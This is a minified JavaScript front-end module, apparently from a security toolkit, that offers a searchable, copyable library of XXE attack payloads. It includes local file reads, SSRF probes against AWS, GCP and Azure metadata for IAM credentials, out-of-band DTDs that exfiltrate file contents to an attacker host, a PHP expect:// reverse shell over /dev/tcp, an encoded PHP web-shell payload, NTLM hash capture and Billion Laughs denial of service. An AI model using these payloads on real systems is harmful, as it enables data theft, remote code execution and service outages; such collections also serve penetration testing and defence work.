import{u as U,i as h}from"./action-BSi9h3E1.js";import{l as O,az as M,Q as L,I as p,J as i,A as x,H as T,u as n,C as m,K as _,L as Y,V as v,z as X,D as w,G as D,ap as G,y as s}from"./vendor-C2WOFBut.js";import{_ as B}from"./tool-BsZ2CvQX.js";import"./vendor-lodash-BDISS5yc.js";import"./modulepreload-polyfill-B5Qt9EMX.js";import"./vendor-monaco-Dc_R4fc0.js";const H={id:"basic_read",name:"基础文件读取",nameEn:"Basic File Read",payloads:[{id:"br-1",name:"Classic DTD file read",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"basic_read",description:"最经典的 XXE 文件读取，通过 ENTITY 引用本地文件"},{id:"br-2",name:"UTF-16 encoding bypass",payload:`<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"basic_read",description:"使用 UTF-16 编码绕过某些仅检查 UTF-8 的 WAF"},{id:"br-3",name:"PHP filter base64 read",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"basic_read",description:"PHP 环境下使用 php://filter 将文件内容 base64 编码输出，避免 XML 解析错误"},{id:"br-4",name:"Windows file read (UNC)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<foo>&xxe;</foo>`,category:"basic_read",description:"Windows 环境文件读取"},{id:"br-5",name:"Inline DTD with multiple entities",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe1 SYSTEM "file://{{TARGET_FILE}}">
  <!ENTITY xxe2 SYSTEM "file:///etc/hostname">
]>
<foo><a>&xxe1;</a><b>&xxe2;</b></foo>`,category:"basic_read",description:"在同一个文档中读取多个文件"},{id:"br-6",name:"Netdoc protocol (Java)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "netdoc://{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"basic_read",description:"Java 环境下使用 netdoc:// 协议作为 file:// 的替代"},{id:"br-7",name:"file:/// triple-slash variant",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"basic_read",description:"使用 file:/// 三斜杠格式（绝对路径）"},{id:"br-8",name:"XInclude file read",payload:`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file://{{TARGET_FILE}}"/>
</foo>`,category:"basic_read",description:"当无法控制 DOCTYPE 时，利用 XInclude 读取文件"},{id:"br-9",name:"SVG image XXE",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>`,category:"basic_read",description:"通过上传恶意 SVG 图片触发 XXE（图片上传场景）"}]},K={id:"ssrf_via_xxe",name:"SSRF 探测",nameEn:"SSRF via XXE",payloads:[{id:"ssrf-1",name:"AWS metadata (IMDSv1)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"探测 AWS EC2 实例元数据（IMDSv1），可获取 IAM 凭据等"},{id:"ssrf-2",name:"AWS IAM credentials",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"直接获取 AWS IAM 角色名称列表"},{id:"ssrf-3",name:"GCP metadata",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"探测 GCP 实例元数据服务"},{id:"ssrf-4",name:"Azure metadata",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"探测 Azure 实例元数据服务"},{id:"ssrf-5",name:"Internal HTTP service probe",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"探测本地 8080 端口的内部服务"},{id:"ssrf-6",name:"Internal network scan",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"探测内网网关/设备"},{id:"ssrf-7",name:"FTP SSRF (Java)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "ftp://{{ATTACKER_URL}}:2121/test">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"通过 FTP 协议进行 SSRF（Java 解析器支持）"},{id:"ssrf-8",name:"Gopher SSRF",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"通过 gopher 协议与内部 Redis 交互"},{id:"ssrf-9",name:"DigitalOcean metadata",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/v1/">
]>
<foo>&xxe;</foo>`,category:"ssrf_via_xxe",description:"探测 DigitalOcean Droplet 元数据"}]},V={id:"blind_oob",name:"Blind/OOB 外带",nameEn:"Blind/OOB XXE",payloads:[{id:"oob-1",name:"OOB via external DTD (HTTP)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>`,category:"blind_oob",description:"加载攻击者服务器上的外部 DTD，DTD 中定义数据外带逻辑"},{id:"oob-2",name:"External DTD content (evil.dtd)",payload:`<!ENTITY % file SYSTEM "file://{{TARGET_FILE}}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{{ATTACKER_URL}}/?data=%file;'>">
%eval;
%exfil;`,category:"blind_oob",description:"放置在攻击者服务器上的 evil.dtd 内容，将文件数据通过 URL 参数外带"},{id:"oob-3",name:"OOB via external DTD (FTP)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>`,category:"blind_oob",description:"同 OOB HTTP，配合 FTP 通道外带多行文件内容"},{id:"oob-4",name:"External DTD content (FTP exfil)",payload:`<!ENTITY % file SYSTEM "file://{{TARGET_FILE}}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{{ATTACKER_URL}}:2121/%file;'>">
%eval;
%exfil;`,category:"blind_oob",description:"通过 FTP 协议外带数据（支持多行），配合 FTP 日志获取内容"},{id:"oob-5",name:"OOB DNS exfiltration",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/dns-exfil.dtd">
  %dtd;
]>
<foo>&send;</foo>`,category:"blind_oob",description:"通过 DNS 查询外带数据（绕过 HTTP 出站限制）"},{id:"oob-6",name:"DNS exfil DTD content",payload:`<!ENTITY % file SYSTEM "file://{{TARGET_FILE}}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.{{ATTACKER_URL}}'>">
%eval;
%exfil;`,category:"blind_oob",description:"DNS 外带 DTD 内容，将文件内容作为子域名发送"},{id:"oob-7",name:"Blind XXE error-based (local DTD)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file://{{TARGET_FILE}}">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>test</foo>`,category:"blind_oob",description:"利用系统本地 DTD 文件触发报错回显数据（无需外部服务器）"},{id:"oob-8",name:"PHP expect OOB",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/php-oob.dtd">
  %dtd;
]>
<foo>&send;</foo>`,category:"blind_oob",description:"PHP 环境下配合 expect:// wrapper 的 OOB 外带"}]},k={id:"parameter_entity",name:"参数实体滥用",nameEn:"Parameter Entity Abuse",payloads:[{id:"pe-1",name:"Parameter entity file read",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{{TARGET_FILE}}">
  <!ENTITY % eval "<!ENTITY &#x25; display SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %display;
]>
<foo>test</foo>`,category:"parameter_entity",description:"利用参数实体嵌套和报错信息泄露文件内容"},{id:"pe-2",name:"Nested parameter entity (internal subset)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file://{{TARGET_FILE}}">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/combine.dtd">
  %dtd;
]>
<foo>&all;</foo>`,category:"parameter_entity",description:"通过参数实体组合 CDATA 包裹文件内容"},{id:"pe-3",name:"Parameter entity HTTP callback",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{{ATTACKER_URL}}/callback">
  %xxe;
]>
<foo>test</foo>`,category:"parameter_entity",description:"最简单的参数实体回调检测，确认 XXE 是否存在"},{id:"pe-4",name:"Chained parameter entities",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % a SYSTEM "{{ATTACKER_URL}}/stage1.dtd">
  %a;
  %b;
  %c;
]>
<foo>&final;</foo>`,category:"parameter_entity",description:"多级参数实体链式加载，stage1.dtd 中定义 %b，以此类推"},{id:"pe-5",name:"Local DTD repurpose (GNOME)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %local;
]>
<foo>test</foo>`,category:"parameter_entity",description:"复用本地系统 DTD 文件进行参数实体注入（GNOME 系统）"},{id:"pe-6",name:"Local DTD repurpose (Apache)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/doc/apache2/README.Debian">
  %local;
]>
<foo>test</foo>`,category:"parameter_entity",description:"复用 Apache 安装自带的本地文件辅助攻击"}]},z={id:"cdata_exfil",name:"CDATA 外带",nameEn:"CDATA Exfiltration",payloads:[{id:"cdata-1",name:"CDATA wrapper via external DTD",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/cdata.dtd">
  %dtd;
]>
<foo>&all;</foo>`,category:"cdata_exfil",description:"通过外部 DTD 将文件内容包裹在 CDATA 中返回"},{id:"cdata-2",name:"CDATA DTD content (cdata.dtd)",payload:`<!ENTITY % file SYSTEM "file://{{TARGET_FILE}}">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY all "%start;%file;%end;">`,category:"cdata_exfil",description:"cdata.dtd 文件内容 — 组合 CDATA 包裹和文件实体"},{id:"cdata-3",name:"CDATA with PHP base64",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={{TARGET_FILE}}">
  <!ENTITY % dtd SYSTEM "{{ATTACKER_URL}}/cdata-b64.dtd">
  %dtd;
]>
<foo>&all;</foo>`,category:"cdata_exfil",description:"结合 PHP base64 编码和 CDATA 包裹，双重保险避免解析错误"},{id:"cdata-4",name:"Inline CDATA construct",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<foo><![CDATA[prefix]]>&xxe;<![CDATA[suffix]]></foo>`,category:"cdata_exfil",description:"在标签内直接用 CDATA 段包裹实体引用"}]},W={id:"dos",name:"拒绝服务 (DoS)",nameEn:"Denial of Service",payloads:[{id:"dos-1",name:"Billion Laughs (XML Bomb)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`,category:"dos",description:"经典 Billion Laughs 攻击，指数级实体展开导致内存耗尽（约 3GB）"},{id:"dos-2",name:"Quadratic Blowup",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>`,category:"dos",description:"二次膨胀攻击 — 单个大实体被多次引用，绕过嵌套深度限制"},{id:"dos-3",name:"External entity DoS (/dev/random)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>`,category:"dos",description:"读取 /dev/random 导致解析器无限阻塞"},{id:"dos-4",name:"External entity DoS (/dev/zero)",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/zero">
]>
<foo>&xxe;</foo>`,category:"dos",description:"读取 /dev/zero 产生无限零字节流耗尽内存"},{id:"dos-5",name:"Recursive external DTD",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % a SYSTEM "{{ATTACKER_URL}}/recursive.dtd">
  %a;
]>
<foo>test</foo>`,category:"dos",description:"递归加载外部 DTD 导致无限循环（recursive.dtd 引用自身）"}]},j={id:"parser_specific",name:"解析器特定",nameEn:"Parser Specific",payloads:[{id:"ps-1",name:"PHP expect:// RCE",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"PHP expect:// wrapper 直接执行系统命令（需安装 expect 扩展）"},{id:"ps-2",name:"PHP expect:// reverse shell",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/{{ATTACKER_URL}}/4444 0>&1'">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"通过 expect:// wrapper 获取反弹 Shell"},{id:"ps-3",name:"PHP data:// wrapper",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"PHP data:// wrapper 注入 Base64 编码的 PHP 代码"},{id:"ps-4",name:"Java jar:// protocol",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://{{ATTACKER_URL}}/evil.jar!/payload.txt">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"Java jar:// 协议会下载远程 JAR 文件并解压读取，可触发文件写入"},{id:"ps-5",name:"Java jar:// SSRF with temp file",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://{{ATTACKER_URL}}/evil.jar!/">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"jar:// 协议下载 JAR 到临时目录，配合其他漏洞可利用临时文件"},{id:"ps-6",name:".NET DTD processing",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:".NET XmlDocument / XmlReader 默认可能启用 DTD 处理（取决于版本）"},{id:"ps-7",name:".NET UNC path NTLM capture",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "\\\\{{ATTACKER_URL}}\\share\\test">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"Windows .NET 环境下通过 UNC 路径捕获 NTLM Hash（配合 Responder）"},{id:"ps-8",name:"Python lxml entity expansion",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"Python lxml 默认禁用外部实体，但 resolve_entities=True 时可利用"},{id:"ps-9",name:"Ruby Nokogiri XXE",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<foo>&xxe;</foo>`,category:"parser_specific",description:"Ruby Nokogiri < 1.13.2 默认启用外部实体加载"},{id:"ps-10",name:"SOAP XXE injection",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>`,category:"parser_specific",description:"在 SOAP 请求中注入 XXE（Web Service 场景）"},{id:"ps-11",name:"XLSX/DOCX embedded XXE",payload:`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{TARGET_FILE}}">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="&xxe;"/>
</Types>`,category:"parser_specific",description:"在 XLSX/DOCX 的 [Content_Types].xml 中注入 XXE"}]},I=[H,K,V,k,z,W,j];function J(y,r,c){return y.replace(/\{\{TARGET_FILE\}\}/g,r).replace(/\{\{ATTACKER_URL\}\}/g,c)}const $={class:"sectool-xxe-count"},Q={class:"sectool-xxe-section-title"},q=O({__name:"Xxe",async setup(y){let r,c;const A=[{value:"all",label:"All"},...I.map(e=>({value:e.id,label:e.name}))],a=U(([r,c]=M(()=>h({selectedCategory:"all",targetFile:"/etc/passwd",attackerUrl:"http://attacker.com",search:""})),r=await r,c(),r)),u=e=>J(e,a.current.targetFile,a.current.attackerUrl),C=(e,o)=>{if(!o)return!0;const t=o.toLowerCase();return e.name.toLowerCase().includes(t)||e.payload.toLowerCase().includes(t)||(e.description||"").toLowerCase().includes(t)},S=D(()=>I.map(e=>{const o=e.payloads.filter(t=>a.current.selectedCategory!=="all"&&t.category!==a.current.selectedCategory?!1:C(t,a.current.search));return{...e,payloads:o}}).filter(e=>e.payloads.length>0)),N=D(()=>S.value.reduce((e,o)=>e+o.payloads.length,0));return(e,o)=>{const t=T("Select"),E=T("Input"),g=T("Align"),P=T("Display"),F=T("Textarea"),b=T("HeightResize"),R=G("row");return L((s(),p("div",null,[i(g,{direction:"vertical"},{default:x(()=>[i(P,null,{default:x(()=>[i(g,{direction:"vertical"},{default:x(()=>[i(t,{modelValue:n(a).current.selectedCategory,"onUpdate:modelValue":o[0]||(o[0]=l=>n(a).current.selectedCategory=l),label:e.$t("xxe_category"),options:A},null,8,["modelValue","label"]),i(E,{modelValue:n(a).current.targetFile,"onUpdate:modelValue":o[1]||(o[1]=l=>n(a).current.targetFile=l),label:e.$t("xxe_target_file"),placeholder:e.$t("xxe_target_file_placeholder")},null,8,["modelValue","label","placeholder"]),i(E,{modelValue:n(a).current.attackerUrl,"onUpdate:modelValue":o[2]||(o[2]=l=>n(a).current.attackerUrl=l),label:e.$t("xxe_attacker_url"),placeholder:e.$t("xxe_attacker_url_placeholder")},null,8,["modelValue","label","placeholder"]),i(E,{modelValue:n(a).current.search,"onUpdate:modelValue":o[3]||(o[3]=l=>n(a).current.search=l),label:e.$t("xxe_search"),placeholder:e.$t("xxe_search_placeholder")},null,8,["modelValue","label","placeholder"])]),_:1})]),_:1})]),_:1}),i(b,null,{default:x(({height:l})=>[m("div",{style:w({height:l+"px",overflowY:"auto"})},[m("div",$,_(e.$t("xxe_payload_count",[N.value])),1),(s(!0),p(Y,null,v(S.value,f=>(s(),p(Y,{key:f.id},[m("div",Q,_(f.name),1),(s(!0),p(Y,null,v(f.payloads,d=>(s(),X(F,{key:d.id,"model-value":u(d.payload),height:80,placeholder:d.name+(d.description?" — "+d.description:""),copy:d.name},null,8,["model-value","placeholder","copy"]))),128))],64))),128))],4)]),_:1})])),[[R,"10-14"]])}}}),ie=B(q,[["__scopeId","data-v-6219b44a"]]);export{ie as default};
